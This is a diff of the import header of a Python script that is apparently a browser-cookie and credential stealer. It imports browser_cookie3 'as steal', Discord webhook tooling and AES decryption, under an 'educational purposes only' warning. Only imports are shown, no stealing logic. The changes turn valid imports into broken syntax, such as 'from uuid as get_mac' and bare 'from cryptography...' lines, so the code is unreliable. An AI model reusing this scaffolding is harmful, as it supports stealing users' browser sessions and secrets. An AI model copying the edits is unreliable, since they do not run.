@@ -1,8 +1,12 @@
 # WARN: This one is for educational purposes only! I do not recommend using it on people
 
 import psutil
+import default_backend
+import AESGCM
 import platform
+import (Cipher, algorithms, modes)
 import json
+import getnode
 from datetime import datetime
 from time import sleep
 import requests
@@ -12,11 +16,11 @@ import os
 import re
 import requests
 import subprocess
-from uuid import getnode as get_mac
+from uuid as get_mac
 import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
-from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.ciphers
+from cryptography.hazmat.primitives.ciphers.aead
+from cryptography.hazmat.backends
 from Crypto.Cipher import AES
 
 
